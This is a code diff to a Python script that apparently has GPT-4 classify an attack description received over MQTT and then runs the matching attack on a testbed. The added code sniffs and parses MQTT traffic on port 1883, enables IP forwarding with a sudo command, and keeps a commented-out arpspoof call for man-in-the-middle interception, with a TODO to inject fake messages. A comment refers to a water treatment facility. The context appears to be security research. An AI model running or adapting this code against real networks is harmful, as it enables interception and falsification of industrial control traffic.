@@ -1,16 +1,24 @@
 import os
 from urllib import response
 import openai
+import json
 import paho.mqtt.client as mqtt
 from langchain.prompts import ChatPromptTemplate
 from langchain_openai import ChatOpenAI
+from scapy.all import sniff, IP, TCP
+import struct
+import subprocess
+import signal
+import time
 #from langchain.chat_models import ChatOpenAI
-openai.api_key = "USE-OWN-API-KEY"
+API_KEY = "Insert here"
+openai.api_key = API_KEY
 llm_model = "gpt-4"
 
 
 message = ""
-
+sniffed_topic = ""
+sniffed_message = ""
 def lang_classification ():
     #print(rec)
     llm_model = "gpt-4"
@@ -53,10 +61,11 @@ def lang_classification ():
     prompt_template = ChatPromptTemplate.from_template(attack_template)
     #print(prompt_template)
     messages = prompt_template.format_messages(text=high_level_attack_description)
-    chat = ChatOpenAI(temperature=0.0, model=llm_model, openai_api_key="USE-OWN-API-KEY")
+    chat = ChatOpenAI(temperature=0.0, model=llm_model, openai_api_key= API_KEY)
     response = chat(messages)
     print(response.content)
-
+    json_data = json.loads(response.content)
+    return json_data
 
     
     #The network speed at the water treatment facility has been slowing \
@@ -80,29 +89,79 @@ def on_message(client, userdata, msg):
     #print (message)
     #print (rec)
     #print (message)
-    
+def mqtt_payload_parser(payload):
+    try:
+        # Skip the fixed header (2 bytes minimum, could be more based on Remaining Length encoding)
+        # and variable header starting with the topic length (2 bytes)
+        topic_len = struct.unpack(">H", payload[2:4])[0]  # MQTT topic length is 2 bytes big-endian
+        topic = payload[4:4+topic_len].decode()  # Extract topic
+        message = payload[4+topic_len:].decode()  # Extract message
+        return topic, message
+    except Exception as e:
+        print(f"Error parsing MQTT payload: {e}")
+        return None, None
+
+def process_packet(packet):
+    global sniffed_topic, sniffed_message
+    if packet.haslayer(TCP) and packet.haslayer(IP):
+        ip_src = packet[IP].src
+        ip_dst = packet[IP].dst
+        tcp_sport = packet[TCP].sport
+        tcp_dport = packet[TCP].dport
+#        print("incomming ")
+        # Check if this is MQTT traffic between the two VMs
+        if (tcp_sport == 1883 or tcp_dport == 1883):
+            # Attempt to parse MQTT payload
+            topic, message = mqtt_payload_parser(bytes(packet[TCP].payload))
+#            print("conversation detected")
+            if topic and message:
+                print(f"MQTT Packet from {ip_src} to {ip_dst}\nTopic: {topic}\nMessage: {message}")
+                sniffed_message = message
+                sniffed_topic = topic
+        
+                
+
+def execute_attack(json_response):
+    if (json_response["attack_class_dos"]):
+        print("Perform Denial of Service")
+    elif (json_response["attack_class_fdt"]):
+        print("Perform fake data transfer")
+        fake_data_transfer_attack()
+    elif (json_response["attack_class_phsh"]):
+        print("Perform phishing attack")
+
+def fake_data_transfer_attack():
+    #Enables ip forwarding (hence passing on the packets we get)
+    os.system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward")
+    #Reroutes packets from the MQTT server through this computer.
+    #process = subprocess.Popen(["sudo", "arpspoof", "-i", "enp0s3", "-t", "192.168.1.15", "-r", "192.168.1.1"])
+    #start_time = time.time()
+    print("Starting to capture MQTT packets on port 1883 on the testbed")
+    sniff(prn=process_packet, filter="tcp port 1883", store=False, timeout= 10)
+    print("Topic Found: " + sniffed_topic + "Message Found:" + sniffed_message)
+    #process.terminate()
+    #TODO: Figure out how to terminate arpspoof, use identified topic to stop message from going through and send fake message.
     
 client = mqtt.Client()
 
 client.on_connect = on_connect
 client.on_message = on_message
 
-client.connect("broker.hivemq.com", 1883)
+client.connect("mqtt.eclipseprojects.io", 1883)
 
 client.subscribe("attackMessage")
 
 client.loop_start()
 
 
-
-#if(rec):
-    #lang_classification(message)
-
-
 while True: 
     #lang_classification()
     if(rec):
-        lang_classification ()
+        #response = lang_classification()
+        json_string = '{"attack_class_fdt": true, "attack_class_dos": false, "attack_class_phsh": false}'
+        response = json.loads(json_string)
+        execute_attack(response)
         rec = False
+        break
         #print(1)
 
